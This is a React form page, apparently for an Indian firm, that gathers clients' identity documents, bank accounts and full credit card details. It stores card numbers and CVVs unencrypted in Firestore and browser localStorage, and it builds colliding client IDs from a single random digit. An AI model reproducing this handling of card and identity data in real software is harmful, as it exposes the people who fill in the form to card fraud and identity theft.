import { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { doc, getDoc, addDoc, collection, serverTimestamp, writeBatch } from 'firebase/firestore';
import { db } from '@/lib/firebase';
import { FormData } from '@/types/form';
import { ProgressBar } from '@/components/ProgressBar';
import { FormNavigation } from '@/components/FormNavigation';
import { PersonalInfoStep } from '@/components/steps/PersonalInfoStep';
import { DocumentsStep } from '@/components/steps/DocumentsStep';
import { CreditCardsStep } from '@/components/steps/CreditCardsStep';
import { BankDetailsStep } from '@/components/steps/bankdetailsstep';
import { ReviewStep } from '@/components/steps/ReviewStep';
import { validateMobile } from '@/lib/validation';
import { Loader2 } from 'lucide-react';
import { toast } from 'sonner';

const TOTAL_STEPS = 5;
const STORAGE_KEY = 'client_form_data';

export default function FormPage() {
  const { distributorId } = useParams<{ distributorId: string }>();
  const navigate = useNavigate();
  
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<Partial<FormData>>({
    aadhaarImages: [],
    creditCards: [{ 
      cardNumber: '', 
      cvv: '', 
      expiryDate: '', 
      cardLimit: 0, 
      bankName: '', 
      cardType: 'Credit', 
      cardHolderName: '', 
      cardHolderMobile: '', 
      cardDueDate: '', 
      billGenerationDate: '' 
    }],
    bankAccounts: [{ 
      accountNumber: '', 
      accountHolderName: '', 
      mobile: '', 
      bankName: '', 
      ifscCode: '', 
      branch: '' 
    }],
  });
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});
  const [confirmed, setConfirmed] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [distributorName, setDistributorName] = useState('');
  const [isValidating, setIsValidating] = useState(true);

  useEffect(() => {
    const validateDistributor = async () => {
      if (!distributorId) {
        navigate('/error?reason=missing_id');
        return;
      }

      try {
        const distRef = doc(db, 'distributors', distributorId);
        const distSnap = await getDoc(distRef);

        if (!distSnap.exists()) {
          navigate('/error?reason=invalid_id');
          return;
        }

        setDistributorName(distSnap.data().name);
        setIsValidating(false);
      } catch (error) {
        console.error('Error validating distributor:', error);
        navigate('/error?reason=validation_error');
      }
    };

    validateDistributor();
  }, [distributorId, navigate]);

  useEffect(() => {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        setFormData({
          ...parsed,
          aadhaarImages: parsed.aadhaarImages || []
        });
      } catch (e) {
        console.error('Error loading saved data:', e);
      }
    }
  }, []);

  useEffect(() => {
    if (currentStep > 1 && Object.keys(formData).length > 1) {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(formData));
    }
  }, [formData, currentStep]);

  const handleFieldChange = (field: keyof FormData, value: any) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: undefined }));
    }
  };

  const validateIFSC = (ifsc: string) => {
    const ifscRegex = /^[A-Z]{4}0[A-Z0-9]{6}$/;
    return ifscRegex.test(ifsc);
  };

  const validateStep = (step: number): boolean => {
    const newErrors: Partial<Record<keyof FormData, string>> = {};

    switch (step) {
      case 1:
        if (!formData.name?.trim()) newErrors.name = 'Name is required';
        if (!formData.mobile) {
          newErrors.mobile = 'Mobile number is required';
        } else if (!validateMobile(formData.mobile)) {
          newErrors.mobile = 'Invalid mobile number';
        }
        if (formData.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
          newErrors.email = 'Invalid email address';
        }
        break;

      case 2:
        const aadhaarImages = formData.aadhaarImages || [];
        const hasFront = aadhaarImages.some(img => img.side === 'front');
        const hasBack = aadhaarImages.some(img => img.side === 'back');
        
        if (!hasFront || !hasBack) {
          newErrors.aadhaarImages = 'Both front and back sides of Aadhaar card are required';
        }
        
        if (!formData.panImageUrl?.trim()) {
          newErrors.panImageUrl = 'PAN card image is required';
        }
        break;
     
      case 3:
        if (!formData.bankAccounts || formData.bankAccounts.length === 0) {
          newErrors.bankAccounts = 'At least one bank account is required';
        } else {
          const invalidAccounts = formData.bankAccounts.some(account => {
            return !account.accountNumber?.trim() ||
                   !account.accountHolderName?.trim() ||
                   !account.mobile?.trim() ||
                   account.mobile.length !== 10 ||
                   !account.bankName?.trim() ||
                   !account.ifscCode?.trim() ||
                   !validateIFSC(account.ifscCode) ||
                   !account.branch?.trim();
          });

          if (invalidAccounts) {
            newErrors.bankAccounts = 'Please fill all required fields correctly for all bank accounts';
          }
        }
        break;

      case 4:
        if (!formData.creditCards || formData.creditCards.length === 0) {
          newErrors.creditCards = 'At least one credit card is required';
        } else {
          const invalidCards = formData.creditCards.some(card => {
            const cardNumberDigits = card.cardNumber.replace(/\D/g, '');
            return !card.bankName?.trim() ||
                   !card.cardHolderName?.trim() ||
                   !card.cardHolderMobile?.trim() ||
                   card.cardHolderMobile.length !== 10 ||
                   cardNumberDigits.length < 13 ||
                   !card.cvv?.trim() ||
                   card.cvv.length < 3 ||
                   !card.expiryDate?.trim() ||
                   !card.cardLimit ||
                   card.cardLimit <= 0 ||
                   !card.billGenerationDate?.trim() ||
                   !card.cardDueDate?.trim();
          });

          if (invalidCards) {
            newErrors.creditCards = 'Please fill all required fields correctly for all credit cards';
          }
        }
        break;

      case 5:
        if (!confirmed) {
          toast.error('Please confirm that your information is accurate');
          return false;
        }
        break;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = async () => {
    if (!validateStep(currentStep)) {
      toast.error('Please fix the errors before proceeding');
      console.error('Validation errors:', errors);
      return;
    }

    if (currentStep === TOTAL_STEPS) {
      await handleSubmit();
    } else {
      setCurrentStep(prev => prev + 1);
      window.scrollTo(0, 0);
    }
  };

  const handlePrevious = () => {
    setCurrentStep(prev => prev - 1);
    window.scrollTo(0, 0);
  };

  const handleEditStep = (step: number) => {
    setCurrentStep(step);
    window.scrollTo(0, 0);
  };
  const randomDigit = Math.floor(Math.random() * 9) + 1;

  const handleSubmit = async () => {
    setIsLoading(true);
    try {
const clientId = `CST-01${randomDigit}`;
      const batch = writeBatch(db);

      // Prepare client data
      const clientData = {
        distributorId: distributorId!,
        name: formData.name,
        mobile: formData.mobile,
        email: formData.email || '',
        address: formData.address || '',
        aadhaarImages: formData.aadhaarImages || [],
        panImageUrl: formData.panImageUrl || '',
        bankAccounts: formData.bankAccounts || [],
        creditCards: formData.creditCards?.map(card => ({
          ...card,
          cardNumber: card.cardNumber.replace(/\D/g, ''),
        })) || [],
        submittedAt: serverTimestamp(),
        clientId: clientId,
        source: 'client_form',
      };

      // Add client document
      const clientRef = doc(collection(db, 'clients'));
      batch.set(clientRef, clientData);

      // Create reminders for each credit card
      formData.creditCards?.forEach((card, index) => {
        const reminderData = {
          clientId: clientRef.id,
          clientName: formData.name,
          clientMobile: formData.mobile,
          distributorId: distributorId!,
          distributorName: distributorName,
          cardIndex: index,
          bankName: card.bankName,
          cardHolderName: card.cardHolderName,
          cardHolderMobile: card.cardHolderMobile,
          cardnumber: card.cardNumber,
          billGenerationDate: parseInt(card.billGenerationDate || '0'),
          cardDueDate: parseInt(card.cardDueDate || '0'),
          status: 'pending',
          createdAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        };

        const reminderRef = doc(collection(db, 'reminders'));
        batch.set(reminderRef, reminderData);
      });

      // Commit batch
      await batch.commit();

      localStorage.removeItem(STORAGE_KEY);

      navigate(`/success?ref=${clientId}`);
      toast.success('Form submitted successfully!');
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error('Failed to submit form. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  if (isValidating) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Loader2 className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background pb-12">
      <div className="bg-gradient-to-r from-primary to-primary/80 text-primary-foreground py-8 px-4">
        <div className="max-w-2xl mx-auto">
          <h1 className="text-3xl font-bold mb-2">Priyanka Enterprises</h1>
          <p className="text-primary-foreground/90">Client Details Collection Form</p>
          {distributorName && (
            <p className="text-sm mt-2 text-primary-foreground/80">
              Retailer: {distributorName}
            </p>
          )}
        </div>
      </div>

      <div className="max-w-2xl mx-auto px-4 -mt-4">
        <div className="bg-card rounded-lg shadow-lg p-6 md:p-8">
          <ProgressBar currentStep={currentStep} totalSteps={TOTAL_STEPS} />

          {currentStep === 1 && (
            <PersonalInfoStep
              data={formData}
              onChange={handleFieldChange}
              errors={errors}
            />
          )}
          {currentStep === 2 && (
            <DocumentsStep
              data={formData}
              onChange={handleFieldChange}
              errors={errors}
            />
          )}
          {currentStep === 3 && (
            <BankDetailsStep
              data={formData}
              onChange={handleFieldChange}
              errors={errors}
            />
          )}
          {currentStep === 4 && (
            <CreditCardsStep
              data={formData}
              onChange={handleFieldChange}
              errors={errors}
            />
          )}
          {currentStep === 5 && (
            <ReviewStep
              data={formData}
              onEdit={handleEditStep}
              confirmed={confirmed}
              onConfirmChange={setConfirmed}
            />
          )}

          <FormNavigation
            currentStep={currentStep}
            totalSteps={TOTAL_STEPS}
            onNext={handleNext}
            onPrevious={handlePrevious}
            isNextDisabled={currentStep === 5 && !confirmed}
            isLoading={isLoading}
          />
        </div>
      </div>
    </div>
  );
}